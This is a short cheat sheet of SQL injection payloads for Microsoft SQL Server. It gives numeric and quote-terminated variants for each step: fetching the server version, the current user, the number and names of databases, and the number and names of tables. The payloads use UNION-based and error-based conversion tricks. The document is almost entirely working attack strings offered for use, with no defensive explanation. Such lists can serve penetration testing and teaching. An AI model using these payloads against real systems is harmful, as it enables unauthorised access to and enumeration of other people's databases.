## MSSQL SQLi Guide

### Get server version

*Assuming there’s one column:*

```
1 UNION SELECT @@version--
```

```
1' UNION SELECT @@version--
```

```
1 AND 1=CONVERT(INT,serverproperty('productversion'))--
```

```
1' AND 1=CONVERT(INT,serverproperty('productversion'))--
```

***

### Get current username

*Assuming there’s one column:*

```
1 UNION SELECT user_name()--
```

```
1' UNION SELECT user_name()--
```

***

### Get number of databases

```
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--
```

```
1' AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--
```

***

### Get database names

*replace N with a number starting from 1*


```
1 AND 1=CONVERT(INT,db_name(N))--
```

```
1' AND 1=CONVERT(INT,db_name(N))--
```

***

### Get number of tables

```
1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--
```

```
1' AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--
```

### Get Table name

*replace N with a number starting from 1*

```
1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
```

```
1' AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
```

